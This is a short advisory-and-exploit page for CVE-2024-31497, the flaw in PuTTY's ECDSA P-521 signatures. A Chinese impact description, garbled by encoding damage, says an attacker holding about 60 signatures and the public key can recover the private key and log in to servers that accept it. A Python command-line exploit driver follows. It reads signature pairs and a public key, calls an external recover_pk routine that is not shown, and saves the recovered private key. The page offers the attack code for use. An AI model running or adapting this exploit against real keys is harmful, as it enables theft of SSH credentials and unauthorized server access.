å½±å“æè¿°

  PuTTY ç‰ˆæœ¬0.68 - 0.80ä¸­ä½¿ç”¨NIST P521æ›²çº¿çš„ECDSAç§é’¥ç”Ÿæˆç­¾åçš„ä»£ç ä¸­å­˜åœ¨æ¼æ´ï¼ˆå½“ä½¿ç”¨PuTTYæˆ–Pageantå¯¹SSHæœåŠ¡å™¨è¿›è¡Œèº«ä»½éªŒè¯æ—¶ï¼Œå®ƒä¼šæ ¹æ®å¯†é’¥ç”Ÿæˆç­¾åï¼‰ï¼Œè·å¾—çº¦60æ¡ç­¾åæ¶ˆæ¯å’Œå…¬é’¥çš„å¨èƒè€…å¯èƒ½æ¢å¤ç”¨æˆ·çš„NIST P-521ç§é’¥ï¼Œç„¶åä¼ªé€ ç­¾åï¼Œç™»å½•ä½¿ç”¨è¯¥å¯†é’¥çš„ä»»ä½•æœåŠ¡å™¨ï¼Œå¯¼è‡´ä¿¡æ¯æ³„éœ²å’Œæœªæˆæƒè®¿é—®SSHæœåŠ¡å™¨ç­‰ã€‚

```python

import argparse
from attack.exploit import recover_pk, export_key, read_pubkey


def banner():
    print("""
     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆ    â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ       â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆ   â–ˆâ–ˆ       â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆ â–ˆâ–ˆ   â–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ 
    â–ˆâ–ˆ      â–ˆâ–ˆ    â–ˆâ–ˆ â–ˆâ–ˆ                 â–ˆâ–ˆ â–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆ      â–ˆâ–ˆ â–ˆâ–ˆ   â–ˆâ–ˆ            â–ˆâ–ˆ â–ˆâ–ˆâ–ˆ â–ˆâ–ˆ   â–ˆâ–ˆ â–ˆâ–ˆ   â–ˆâ–ˆ      â–ˆâ–ˆ 
    â–ˆâ–ˆ      â–ˆâ–ˆ    â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ     â–ˆâ–ˆ  
    â–ˆâ–ˆ       â–ˆâ–ˆ  â–ˆâ–ˆ  â–ˆâ–ˆ            â–ˆâ–ˆ      â–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆ â–ˆâ–ˆ           â–ˆâ–ˆ            â–ˆâ–ˆ  â–ˆâ–ˆ      â–ˆâ–ˆ      â–ˆâ–ˆ    â–ˆâ–ˆ   
     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ       â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ      â–ˆâ–ˆ       â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆ      â–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ     â–ˆâ–ˆ   
                                                                                                          
    Author: @ğ»ğ“Šğ‘”ğ‘œğµğ‘œğ“ƒğ’¹ 
                
    """)


def split_values(path):
    values = []
    with open(path,"r") as f:
        for line in f:
            hash, sss = line.split()
            values.append((hash,sss))
    return values


def main(signatures, pubkey, output):
    k = 512  # Nonce bit lenght
    values = split_values(signatures)
    pubkey_hex = read_pubkey(pubkey)
    lines = [(k,hash,sss,pubkey_hex) for hash,sss in values]
    print("Starting private key recovery...")
    pk = recover_pk(lines)
    if pk:

        export_key(pk,output)
        print("\033[92mPrivate key recovered successfully!\033[00m")
        print("Saved in {}".format(output))

    else:

        print("\033[91m Failed to recover private key\033[00m")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2024-31497")
    parser.add_argument("--signatures","-s", help="Signatures files with hex encoded values like this: <Message Hash> <r|s>", required=True)
    parser.add_argument("--pubkey","-pk", help="Hex Encoded Public Key or DER,PEM,OpenSSH format", required=True)
    parser.add_argument("--output","-o", type=str, help="Output Private Key file name", default="private_key")
    args = parser.parse_args()  
    banner()
    main(args.signatures,args.pubkey,args.output)
```

